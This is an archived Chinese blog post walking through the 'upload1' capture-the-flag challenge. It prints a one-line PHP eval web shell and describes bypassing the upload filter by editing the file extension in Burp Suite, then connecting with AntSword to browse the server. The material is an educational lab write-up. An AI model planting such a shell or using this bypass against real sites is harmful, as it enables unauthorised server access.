{"blogid": "125274195", "writerAge": "码龄4年", "writerBlogNum": "19", "writerCollect": "10", "writerComment": "10", "writerFan": "7", "writerGrade": "2级", "writerIntegral": "233", "writerName": "角一角", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_125274195.jpg", "writerRankTotal": "75078", "writerRankWeekly": "490339", "writerThumb": "16", "writerVisitNum": "7204", "blog_read_count": "1121", "blog_time": "已于 2022-06-20 23:08:22 修改", "blog_title": "攻防世界-upload1-(详细操作)做题笔记", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p>为了让自己记忆更深刻，查询跟资料更方便，开始试着写博客，新手菜鸟，思路有不正确的地方，还请各位大佬不吝啬指正，感谢。下面开始做题：</p>\n<p><img alt=\"\" height=\"554\" src=\"..\\..\\static\\image\\64c40cc0bc714d1e9e216c6f1bba499c.png\" width=\"1046\"/></p>\n<p> 进去题目已有提示需要上传文件<img alt=\"\" height=\"583\" src=\"..\\..\\static\\image\\6d04199d155d4081b245c73046dea008.png\" width=\"1059\"/></p>\n<p>这种情况一般是构建一句话木马，利用burpsuite修改包后缀名（一般会限制上传文件类型），上传成功以后注意文件位置，利用菜刀或者是中国蚁剑进行连接， 然后获得flag，这就是具体的思路，下面我们开始实际操作，先构建我们需要的一句话木马：</p>\n<pre><code>&lt;?php \n@eval($_POST['123']);\necho('123');\n?&gt;</code></pre>\n<p>构建的木马放在upload1.txt文本中<img alt=\"\" height=\"647\" src=\"..\\..\\static\\image\\9f4c4941ccdc480ca79488d34a9210ff.png\" width=\"1008\"/></p>\n<p></p>\n<p>然后更改文件的格式，改为jpg上传<img alt=\"\" height=\"209\" src=\"..\\..\\static\\image\\3f061db14b2445c0825bda3806ebc718.png\" width=\"659\"/></p>\n<p><img alt=\"\" height=\"348\" src=\"..\\..\\static\\image\\09eed500642e4c81ae19236fd89c639a.png\" width=\"630\"/></p>\n<p>点击上传以后数据包会被burpsuite拦截，<img alt=\"\" height=\"587\" src=\"..\\..\\static\\image\\84a3d8968fed4a8ca95fa22fa00260cb.png\" width=\"1046\"/></p>\n<p> 将拦截的后缀名jpg更改为php，burpsuite点击forword上传以后一句话木马就上传成功了，观察上传木马的后缀名可以得到该后缀名为php，说明修改成功了。</p>\n<p><img alt=\"\" height=\"616\" src=\"..\\..\\static\\image\\9d25d8936e94406c98f09561967adf39.png\" width=\"1049\"/></p>\n<p></p>\n<p>进入到文件路径</p>\n<p>http://111.200.241.244:56304/upload/1655177536.upload1.php可以查看木马是否上传成功<img alt=\"\" height=\"618\" src=\"..\\..\\static\\image\\569091ea52204ba9822e1eee4abbffc7.png\" width=\"1024\"/></p>\n<p>文件返回值123，在该路径下文件返回了123，说明文件起了作用，现在可以打开中国蚁剑进行连接，在该页面下点击鼠标右键，再点击添加数据</p>\n<p><img alt=\"\" height=\"867\" src=\"..\\..\\static\\image\\86278f81b4eb4b80baf258f6acb1fd71.png\" width=\"1200\"/></p>\n<p> 在URL地址哪里需要填写上传木马的详细路径，不然就无法连接成功。密码为eval($_POST['123'])的中的123<img alt=\"\" height=\"856\" src=\"..\\..\\static\\image\\fa52bf8bab334d06850017eef20a79dc.png\" width=\"1200\"/></p>\n<p></p>\n<p>双击新的连接就可以进去web段。<img alt=\"\" height=\"694\" src=\"..\\..\\static\\image\\3d5f5ed96e3f423dae71ef38130e7396.png\" width=\"1200\"/></p>\n<p> <img alt=\"\" height=\"857\" src=\"..\\..\\static\\image\\d402fb1df1c14adb9eaa0348940055eb.png\" width=\"1200\"/></p>\n<p> 进入网站以后就可以获得文件的访问权限，自己慢慢找文档就可以了，一般在根目录下面可以，或者是www点网站下面可以找到需要的flag<img alt=\"\" height=\"880\" src=\"..\\..\\static\\image\\c33f78646d734b3da35aa5a0ae5ec3a7.png\" width=\"1200\"/></p>\n<p> <img alt=\"\" height=\"847\" src=\"..\\..\\static\\image\\aca4ce40c1bf49ee8bef1b601bd1d153.png\" width=\"1200\"/></p>\n<p></p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-06-20 23:08:22", "summary": "为了让自己记忆更深刻，查询跟资料更方便，开始试着写博客，新手菜鸟，思路有不正确的地方，还请各位大佬不吝啬指正，感谢。下面开始做题：进去题目已有提示需要上传文件这种情况一般是构建一句话木马，利用修改包后"}